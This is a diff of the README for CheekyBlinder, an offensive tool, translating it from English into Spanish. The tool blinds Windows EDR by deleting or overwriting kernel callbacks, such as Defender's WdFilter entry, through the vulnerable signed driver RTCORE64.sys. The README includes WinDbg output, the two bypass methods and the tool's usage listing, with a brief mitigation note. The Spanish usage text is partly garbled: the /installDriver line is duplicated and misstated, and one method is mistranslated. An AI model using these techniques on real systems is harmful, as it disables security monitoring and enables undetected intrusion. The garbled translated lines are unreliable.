 </pre>
 
-`nt!CallbackListHead` is a linked list where each entry at offset 0x28 is the function being called.
+`nt!CallbackListHead` es una lista enlazada donde cada entrada en el offset 0x28 es la función a la que se llama.
 
 <pre>
 lkd> dqs nt!CallbackListHead L2
@@ -590,7 +617,7 @@ ffffd182`c338ff70  ffffd182`c37c2d30
 ffffd182`c338ff78  fffff800`a52f6d90 nt!CallbackListHead
 </pre>
 
-It only contains one entry, let's check what's at offset 0x28 of that entry
+Sólo contiene una entrada, comprobemos qué hay en el offset 0x28 de esa entrada
 
 <pre>
 lkd> dqs nt!CallbackListHead L2
@@ -608,44 +635,43 @@ ffffd182`c338ff90  00000000`00000000
 <mark>ffffd182`c338ff98  fffff800`37f98000 WdFilter+0x28000</mark>
 </pre>
 
-We have 2 options to bypass this:
+Tenemos 2 opciones para evitar esto:
 
-1- Removing the whole link from the linked list => delinking
+1- Eliminar todo el enlace de la lista enlazada => delinking
 
-2- Overwriting the function at offset 0x28 with a KCFG compliant function that just returns rendering the link useless.
+2- Sobreescribiendo la función en el offset 0x28 con una función compatible con KCFG que simplemente devuelva el enlace inútil.
 
-## Mitigation
-Defenders should not allow any new driver to be loaded onto a system, regardless of whether it is signed or not. If a user requires a driver, it must be reviewed and approved by IT. Security teams should configure their EDR or AV platforms to block any new driver from being loaded unless explicitly approved.
+## Mitigación
+Los defensores no deben permitir que se cargue ningún controlador nuevo en un sistema, independientemente de si está firmado o no. Si un usuario necesita un controlador, debe ser revisado y aprobado por TI. Los equipos de seguridad deben configurar sus plataformas EDR o AV para bloquear la carga de cualquier nuevo controlador a menos que se apruebe explícitamente.
 
 ## Usage
 <pre>
 C:\Users\Vixx\Desktop\Tools\PEN-300\EDR Kernel Bypasses\CheekyBlinder-solution\x64\Release>CheekyBlinder.exe
-Usage: CheekyBlinder.exe
- /proc - List Process Creation Callbacks
- /delproc <address> - Remove Process Creation Callback
- /delprocstealth <address> - overwriting the Process Creation function Callback
- /thread - List Thread Creation Callbacks
- /delthread - Remove Thread Creation Callback
- /installDriver - Install the MSI driver
- /uninstallDriver - Uninstall the MSI driver
- /img - List Image Load Callbacks
- /delimg <address> - Remove Image Load Callback
- /reg - List Registry modification callbacks
- /delreg <address> - Remove Registry callback
- /unlinkreg <address> - Remove Registry linked list callback
+Usage: CheekyBlinder. exe
+ /proc - Lista de llamadas de retorno para la creación de procesos
+ /delproc <dirección> - Elimina la llamada de retorno para la creación de procesos
+ /delprocstealth <dirección> - Sobrescribe la llamada de retorno de la función de creación de procesos
+ /thread - Lista de llamadas de retorno para la creación de hilos
+ /delthread - Elimina la llamada de retorno para la creación de hilos
+ /installDriver - Instala el controlador MSI /uninstallDriver - Instala el controlador MSI. Instala el controlador MSI
+ /uninstallDriver - Desinstala el controlador MSI
+ /img - Lista las retrollamadas de carga de imágenes
+ /delimg <address> - Elimina la retrollamada de carga de imágenes
+ /reg - Lista las retrollamadas de modificación del Registro
+ /delreg <address> - Elimina la retrollamada del Registro
+ /unlinkreg <address> - Elimina la retrollamada de lista enlazada del Registro
  </pre>
+Lo que es nuevo del exploit original:
 
-What's new from the original exploit:
+`/unlinkreg` que desvinculará la entrada callback en la lista vinculada.
 
-`/unlinkreg` which will delink the callback entry in the linked list.
+`/delreg` que sobreescribirá la función callback en la entrada de la lista callback con una función compatible con kcfg que no hace nada.
 
-`/delreg` is now working which will overwrite the callback function in the callback list entry with a kcfg compliant function that does nothing.
+`/delprocstealth` sobrescribiendo la función Callback de creación de procesos con una función compatible con kcfg que no hace nada.
 
-`/delprocstealth`  overwriting the Process Creation function Callback with a kcfg compliant function that does nothing.
+aunque podemos usar el mismo método stealth para `img` y `thread` también, yo sólo lo hice para el callback de creación de proceso y el callback de registro.
 
-while we can use the same stealth method for the `img` and `thread` as well, I only did it for the process creation callback and the registry callback.
-
-`RTCORE64.sys` needs to be on the same folder where your exe is.
+`RTCORE64.sys` necesita estar en la misma carpeta donde está tu exe.
 
 ## Reference
 https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/
